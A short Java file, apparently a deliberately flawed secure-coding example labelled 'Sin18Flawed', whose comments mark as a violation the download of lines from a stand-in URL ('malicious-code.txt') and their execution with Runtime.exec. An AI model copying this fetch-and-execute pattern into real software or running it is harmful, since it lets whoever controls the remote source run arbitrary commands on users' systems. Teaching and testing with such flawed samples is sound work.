import java.io.*;
import java.net.*;

public class Sin18Flawed {

    @SuppressWarnings("deprecation")
    public static void main(String[] args) {
        // Violation: Downloading and executing code from an external source
        String url = "http://example.com/malicious-code.txt"; // Assume link is malicious
        
        try {
            // Download the code from the URL
            URL website = new URL(url);
            try (BufferedReader in = new BufferedReader(new InputStreamReader(website.openStream()))) {
                String inputLine;
                while ((inputLine = in.readLine()) != null) {
                    // Execute the downloaded code (Violation)
                    Runtime.getRuntime().exec(inputLine);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
